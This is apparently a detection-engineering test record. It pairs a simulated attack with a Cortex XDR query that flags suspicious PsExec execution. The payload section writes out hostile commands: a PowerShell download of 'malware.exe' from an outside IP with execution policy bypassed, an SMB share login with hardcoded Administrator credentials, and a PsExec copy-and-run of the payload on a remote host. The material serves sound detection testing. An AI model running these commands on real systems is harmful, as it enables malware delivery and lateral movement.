identity.description: An attacker uses PsExec to execute a suspicious command line on a remote host, triggering a Cortex alert for suspicious PsExec usage. The behavior includes unexpected command-line arguments and execution from non-standard locations.

payload.code:
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.0.2.100/malware.exe' -OutFile 'C:\\temp\\malware.exe'"

C:\\temp\\malware.exe -s -d -c "C:\\temp\\malware.exe"

net use \\192.0.2.50\IPC$ /user:Administrator "password123"

psexec.exe \\192.0.2.50 -u Administrator -p password123 -c -f C:\\temp\\malware.exe

expected_artifacts.description: PsExec process execution with suspicious command line

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: PsExec Suspicious CommandLine
biocs.description: Detection of PsExec being executed with suspicious command line arguments
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'psexec.exe'
| filter actor_process_image_name = 'powershell.exe'
| filter action_command_line contains '-s -d -c'
